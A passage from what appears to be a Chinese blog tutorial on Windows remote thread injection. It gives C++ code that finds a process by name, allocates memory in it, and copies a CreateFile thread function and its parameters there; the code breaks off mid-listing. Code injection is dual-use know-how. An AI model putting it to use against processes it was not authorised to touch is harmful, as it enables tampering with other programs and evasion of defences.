函数。</p>\n<p>如何使 CreateFile 在目标进程执行呢？</p>\n<p>创建一个结构体，这个结构体包含：<br />\n <code>CreateFile</code>  的函数地址。<br />\n <code>CreateFile</code>  函数的所有参数。</p>\n<p>使用远程线程注入，这就需要创建一个线程函数，这个线程函数的参数是指向结构体的地址，由于是在目标进程中调用，所以这个地址是目标进程中此结构体的地址。</p>\n<p>如何实现这一点呢？</p>\n<p>给目标进程申请一块私有内存，并写入数据。申请内存的时候会返回内存的地址。<br />\n这样就可以把线程函数和参数都传给目标进程。</p>\n<p>如何去调用线程函数呢？</p>\n<p>可以函数指针来实现</p>\n<p>给目标进程开辟一块内存空间会返回内存地址，把线程函数写入这块内存空间中后，把这块内存的首地址赋给函数指针就可以调用这个线程函数了。</p>\n<p>这个时候 <code>CreateRemoteThread</code>  函数所需要的参数都已经准备完毕，可以直接在目标进程中创建线程执行代码了。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/************************************************************************/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/* 远程线程实现 CreateFile                                               */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/************************************************************************/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Tlhelp32.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;tchar.h></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//CreateFile 函数的参数</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">CreateFileParam</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tDWORD\t\t\tdwCreateFileAddress<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//CreateFile 函数的地址</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tLPCTSTR\t\t\tlpFileName<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 文件名（包含路径）</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tDWORD\t\t\tdwDesiredAccess<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 访问模式（写 / 读）</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tDWORD\t\t\tdwShareMode<span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 共享模式</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tLPSECURITY_ATTRIBUTES lpSecurityAttributes<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 指向安全属性的指针</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tDWORD\t\t\tdwCreationDisposition<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 如何创建</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tDWORD\t\t\tdwFlagsAndAttributes<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 文件属性</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tHANDLE\t\t\thTemplateFile<span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 用于复制文件句柄</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span>CreateFileParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 定义一个 CreateFile 一模一样的函数指针类型</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token function\">HANDLE</span><span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> pCreateFile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tLPCTSTR\t\t\tlpFileName<span class=\"token punctuation\">,</span>\t\t\t\t<span class=\"token comment\">// 文件名（包含路径）</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tDWORD\t\t\tdwDesiredAccess<span class=\"token punctuation\">,</span>\t\t<span class=\"token comment\">// 访问模式（写 / 读）</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tDWORD\t\t\tdwShareMode<span class=\"token punctuation\">,</span>\t\t\t<span class=\"token comment\">// 共享模式</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tLPSECURITY_ATTRIBUTES lpSecurityAttributes<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 指向安全属性的指针</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tDWORD\t\t\tdwCreationDisposition<span class=\"token punctuation\">,</span>\t<span class=\"token comment\">// 如何创建</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tDWORD\t\t\tdwFlagsAndAttributes<span class=\"token punctuation\">,</span>\t<span class=\"token comment\">// 文件属性</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tHANDLE\t\t\thTemplateFile\t\t\t<span class=\"token comment\">// 用于复制文件句柄</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">// 获取进程的 PID</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>DWORD <span class=\"token function\">ByNameGetPid</span><span class=\"token punctuation\">(</span>LPCTSTR lpName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tHANDLE hProcSnap <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPPROCESS<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取进程快照句柄</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>hProcSnap <span class=\"token operator\">!=</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tPROCESSENTRY32 pe32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tpe32<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>PROCESSENTRY32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tBOOL flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32First</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取列表的第一个进程</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">_tcscmp</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">.</span>szExeFile<span class=\"token punctuation\">,</span> lpName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> pe32<span class=\"token punctuation\">.</span>th32ProcessID<span class=\"token punctuation\">;</span><span class=\"token comment\">//pid</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\tflag <span class=\"token operator\">=</span> <span class=\"token function\">Process32Next</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取下一个进程</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">// 编写要复制到目标进程中的函数</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>DWORD WINAPI <span class=\"token function\">CreateFileThreadProc</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token comment\">// 转换参数</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tCreateFileParam<span class=\"token operator\">*</span> cfParam <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>CreateFileParam<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>lpParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token comment\">// 声明变量，赋值</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tpCreateFile pCF <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pCreateFile<span class=\"token punctuation\">)</span>cfParam<span class=\"token operator\">-></span>dwCreateFileAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token comment\">// 传参</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tHANDLE hFile <span class=\"token operator\">=</span> <span class=\"token function\">pCF</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>lpFileName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>dwDesiredAccess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>dwShareMode<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>lpSecurityAttributes<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>dwCreationDisposition<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>dwFlagsAndAttributes<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\tcfParam<span class=\"token operator\">-></span>hTemplateFile</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\">// 远程创建文件</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>BOOL <span class=\"token function\">RemoteCreateFile</span><span class=\"token punctuation\">(</span>DWORD dwPid<span class=\"token punctuation\">,</span> LPCTSTR lpFilePathName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token comment\">//. 获取进程的句柄</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tHANDLE hProcess <span class=\"token operator\">=</span> <span class=\"token function\">OpenProcess</span><span class=\"token punctuation\">(</span>PROCESS_ALL_ACCESS<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> dwPid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hProcess <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OpenProcessError!: %d\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token comment\">// 分配内存</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token comment\">// 用来存储字符串参数中的文件名</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//wcslen 获取的是字符数，要将其转换为字节数</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">// 函数执行成功返回内存首地址</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\tLPVOID MemAddressOfFileName <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAllocEx</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t<span class=\"token function\">_tcslen</span><span class=\"token punctuation\">(</span>lpFilePathName<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\tMEM_COMMIT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\tPAGE_READWRITE</pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>MemAddressOfFileName <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Write MemAddressOfFileName Error!: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t<span class=\"token comment\">// 用来存储线程函数</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\tLPVOID MemAddressOfThreadProc <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAllocEx</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t<span class=\"token number\">0x400</span><span class=\"token punctuation\">,</span><span class=\"token comment\">// 函数在内存中的大小给个大点的值</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\tMEM_COMMIT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\tPAGE_EXECUTE</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>MemAddressOfThreadProc <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Write MemAddressOfThreadProc Error!: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t<span class=\"token comment\">// 关闭资源</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t<span class=\"token comment\">// 用来存储文件参数</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\tLPVOID MemAddressOfParam <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAllocEx</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t<span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>CreateFileParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\tMEM_COMMIT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t\tPAGE_READWRITE</pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>MemAddressOfParam <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Write MemAddressOfParam Error!: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t<span class=\"token comment\">// 关闭资源</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t<span class=\"token comment\">// 初始化参数</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\tCreateFileParam cfParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t<span class=\"token comment\">// 文件名</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>lpFileName <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span>MemAddressOfFileName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t<span class=\"token comment\">// 其他参数</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>dwDesiredAccess <span class=\"token operator\">=</span> GENERIC_READ <span class=\"token operator\">|</span> GENERIC_WRITE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>dwShareMode <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>lpSecurityAttributes <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>dwCreationDisposition <span class=\"token operator\">=</span> OPEN_ALWAYS<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>dwFlagsAndAttributes <span class=\"token operator\">=</span> FILE_ATTRIBUTE_NORMAL<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>hTemplateFile <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t<span class=\"token comment\">// 获取 CreateFile 的地址</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\tHMODULE hModule <span class=\"token operator\">=</span> <span class=\"token function\">GetModuleHandle</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"kernel32.dll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\tcfParam<span class=\"token punctuation\">.</span>dwCreateFileAddress <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span><span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span>hModule<span class=\"token punctuation\">,</span> <span class=\"token string\">\"CreateFileW\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t<span class=\"token comment\">// 开始复制到目标进程</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"166\"></td><td><pre>\t<span class=\"token comment\">// 拷贝文件名</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t<span class=\"token function\">WriteProcessMemory</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\tMemAddressOfFileName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\tlpFilePathName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t<span class=\"token function\">_tcslen</span><span class=\"token punctuation\">(</span>lpFilePathName<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>\t<span class=\"token comment\">// 拷贝线程函数</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>\t<span class=\"token comment\">// </span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>\t<span class=\"token comment\">// 修改线程函数起始地址</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\tDWORD dwFunAddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>CreateFileThreadProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>\t<span class=\"token comment\">// 间接 CALL</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>BYTE<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dwFunAddr<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>\t\tdwFunAddr <span class=\"token operator\">=</span> dwFunAddr <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>dwFunAddr <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>\t<span class=\"token 